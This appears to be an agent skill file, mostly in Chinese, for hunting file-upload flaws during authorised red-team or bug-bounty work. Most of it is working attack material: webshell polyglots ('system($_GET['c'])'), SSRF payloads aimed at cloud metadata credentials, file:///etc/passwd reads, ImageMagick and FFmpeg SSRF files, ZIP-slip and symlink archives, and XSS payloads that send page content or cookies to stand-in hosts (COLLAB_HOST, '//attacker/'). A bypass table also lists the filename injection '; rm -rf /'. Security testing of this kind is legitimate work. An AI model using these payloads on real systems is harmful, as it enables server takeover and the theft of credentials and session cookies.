---
name: hunt-file-upload
description: "狩猎文件上传缺陷 — 通过 webshell 实现 RCE、通过 SVG/HTML 实现 XSS、通过 DOCX 中的 XXE 实现 SSRF、通过文件名实现路径穿越。绕过表（10 种技术）：双扩展名（server checks last ext only 时用 shell.php.jpg）、magic bytes 伪造（PHP 文件加 PNG 头）、空字节（shell.php\0.jpg）、大小写（.PHP、.Php、.pHP）、上传 .htaccess 以启用执行、带 <script> 的 SVG、HTML/SVG XSS、内嵌 XXE 的 DOCX、ZIP slip（归档中的 ../../../etc/passwd）、多语言（polyglot）文件。检测：任何 /upload、/avatar、/profile-picture、/attachment、/import 端点。测试：上传 PHP/JSP/ASPX shell，通过直接 URL 请求，检查响应。验证：RCE 需实际代码执行（whoami 输出）；个人头像 URL 中的反射型 XSS。适用于测试文件上传功能、头像/附件端点、导入/导出功能、XML/DOCX/ZIP 处理器。真实付费案例。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [file-upload, hunt, redteam]
  category: redteam
---

## When to Use

- 测试文件上传功能、头像/附件端点、导入/导出功能、XML/DOCX/ZIP 处理器。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`curl`、`python3`。
- 可写证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何会改变状态的步骤（写入、上传、凭据尝试），在命令执行前立即获得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
export PAYLOAD='<html><body><script>fetch("http://COLLAB_HOST/chrome-rce?d="+encodeURIComponent(document.documentElement.innerHTML))</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "$(python3 -c 'import json,os; print(json.dumps({"html": os.environ["PAYLOAD"]}))')"
```

## Procedure

下文各阶段即为操作流程。保持每个探测请求有界（`--max-time`），将证据记录到 `OUTPUT_DIR` 下，并在 Pitfalls 中列出的停止条件处停止。

## Content-Type 与扩展名绕过

### Content-Type 绕过
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### 文件上传绕过技术（10 种技术）

| 攻击 | 方式 | 防护 |
|---|---|---|
| 扩展名绕过 | `shell.php.jpg`、`shell.pHp`、`shell.php5` | 白名单 + 提取最终扩展名 |
| 空字节 | `shell.php%00.jpg` | 过滤空字节 |
| 双扩展名 | `shell.jpg.php` | 只允许单一扩展名 |
| MIME 伪造 | Content-Type: image/jpeg 搭配 .php 内容 | 校验 magic bytes，而非 MIME 头 |
| Magic bytes 前缀 | 在 PHP 代码前添加 `GIF89a;` | 解析整个文件，而非只解析头部 |
| Polyglot | 同时是合法 JPEG 和 PHP | 用图像库处理，无效则拒绝 |
| SVG JavaScript | `<svg onload="...">` | 净化 SVG 或完全禁止 |
| DOCX 中的 XXE | Office ZIP 中的恶意 XML | 禁用外部实体 |
| ZIP slip | 归档中的 `../../../etc/passwd` | 校验解压路径 |
| 文件名注入 | 文件名中的 `; rm -rf /` | 净化 + 使用 UUID 命名 |

### Magic Bytes 参考

| 类型 | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### 通过 SVG 的存储型 XSS
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg 利用

### ImageMagick SSRF / 文件读取（ImageTragick 家族 + 现代变体）
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### 通过 HLS 播放列表的 FFmpeg SSRF
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF 生成器 SSRF

### HTML → PDF 转换器攻击
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
export PAYLOAD='<html><body><script>fetch("http://COLLAB_HOST/chrome-rce?d="+encodeURIComponent(document.documentElement.innerHTML))</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "$(python3 -c 'import json,os; print(json.dumps({"html": os.environ["PAYLOAD"]}))')"
```

---

## 归档解压攻击（Zip Slip / 符号链接）

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Pitfalls
- **上传但未执行** — 将 `.php` 文件上传到以 text/plain 提供它的目录并不是 RCE。需要代码执行，而不仅仅是文件存储。
- **SVG XSS 未在同源渲染** — 上传到不同源的 SVG 可能因 CSP 或同源策略而无法执行脚本。要在实际的渲染上下文中测试。
- **绕过扩展名黑名单但无服务端校验** — 绕过客户端扩展名检查不能证明任何东西。始终测试服务端的接受情况。
- **Content-Type 伪造** — 修改 Content-Type 头并不会改变服务器处理文件的方式。需要确认服务端的 MIME 混淆。
- **文件名中的路径穿越** — 文件名中的 `../../../etc/passwd` 是路径穿越，而不是上传漏洞利用。要区分两者。

---

## Verification

- 每个被提升为发现的结论都说明了预期行为、观察到的响应，以及排除误报的阴性对照。
- 影响以所需的最小状态变化来证明；仅有状态码、banner 或扫描器标签不构成发现。
- 请求、响应、UTC 时间戳和工具版本记录在 `${OUTPUT_DIR:-./output}` 下，以便审阅者复现该主张。

---

## 相关技能与链路

- **`hunt-rce`** — 一旦你找到直接提供文件的上传目录或由反序列化器供数据的处理器，文件上传就是经典 PHP/JSP/ASPX 技术栈上通往 RCE 最常见的路径。链路原语：polyglot `GIF89a;<?php system($_GET['c']);?>` 绕过 magic-byte 检查 + `.phtml` 扩展名绕过白名单 → `GET /uploads/shell.phtml?c=id` → RCE；或上传 PHP `phar://` 到对攻击者控制路径调用 `file_exists()` 的 sink → PHP 对象反序列化 → RCE。
- **`hunt-xxe`** — Office 格式（DOCX/XLSX/PPTX）、SVG 和 SOAP 附件都是 ZIP 内的 XML — 每个“上传并解析”功能都是潜在的 XXE 候选。链路原语：上传 DOCX，其 `[Content_Types].xml` 或 `word/document.xml` 包含指向攻击者控制 DTD 的参数实体 DTD → 盲 XXE OOB 文件读取 → 通过文档解析器窃取 `/etc/passwd` 或 `web.config`。
- **`hunt-xss`** — 上传后在同源提供服务的 SVG、HTML 文件和 PDF 是存储型 XSS 的制造工厂。链路原语：上传带 `<script>fetch('//attacker/?'+document.cookie)</script>` 的 SVG → 受害者在 `app.target.com/uploads/x.svg` 查看附件（同源、未被沙箱隔离）→ Cookie 窃取 → 通过会话劫持实现 ATO。
- **`hunt-ssrf`** — 图像处理库（ImageMagick、ffmpeg）会从上传文件内部获取远程 URL。链路原语：上传带 `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` 的 SVG/MVG，或使用 ffmpeg `concat:http://internal/...` → SSRF 到 AWS IMDS → 云凭据；ImageTragick CVE-2016-3714 家族在遗留农场中依然活跃。
- **`security-arsenal`** — 取用文件上传绕过树：10 行扩展名/MIME/magic-byte 绕过表（双扩展名、空字节、大小写变体、`.phtml`/`.phar`/`.php5`/`.pht`、上传 `.htaccess` 以重新启用处理器、在 IIS 上上传 `web.config`）、SVG/MVG/SVGZ payload、DOCX-XXE 模板、归档中的 ZIP-slip 路径穿越、polyglot 生成器。
- **`triage-validation`** — 应用可复现性门槛。一个成功上传但从未被提供、从未被执行、从未被任何东西解析的文件不构成发现 — 它只是一个只写的 blob。严重 RCE 需要从上传的 shell 完成真实的 `whoami` 往返；存储型 XSS 需要在受害者浏览器中弹出，而不仅仅是文件存在于磁盘上。

### Phase X — 处理竞态与 CDN 缓存投毒

处理竞态：上传良性文件 → 处理器校验通过 → 攻击者在提供之前用恶意文件覆盖。
通过上传头进行 CDN 缓存投毒：对上传的图片强制 `Cache-Control: public, max-age=31536000` + `Content-Type: text/html`。
Zip Slip：创建带 `../../../var/www/html/shell.php` 路径穿越条目的归档。
